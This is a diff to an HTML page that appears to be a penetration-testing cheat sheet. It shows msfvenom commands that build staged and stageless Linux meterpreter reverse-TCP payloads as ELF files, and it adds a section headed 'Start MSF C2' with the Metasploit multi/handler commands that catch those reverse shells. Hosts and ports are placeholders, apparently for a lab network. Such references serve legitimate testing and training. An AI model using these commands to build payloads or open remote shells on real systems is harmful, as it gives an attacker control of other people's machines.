@@ -21,6 +21,15 @@
     <h2>MSF Payloads</h2>
     <p><b>Create Payload (staged): <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf</code></b></p>
     <p><b>Create Payload (stageless): <code>msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf</code></b></p>
+    <h2>Start MSF C2</h2>
+    <p>
+        <b>use exploit/multi/handler </b><br>
+        <b>set payload linux/x86/meterpreter/reverse_tcp</b><br>
+        <b>set lhost [IP]</b><br>
+        <b>set lport [port]</b><br>
+        <b>exploit</b><br><br>
+        <i>NT: *remote host >> set ExitOnSession</i>
+    </p>
     <div>     
  <!--     Auxiliary modules list from here           -->
  <div id="auxiliary">
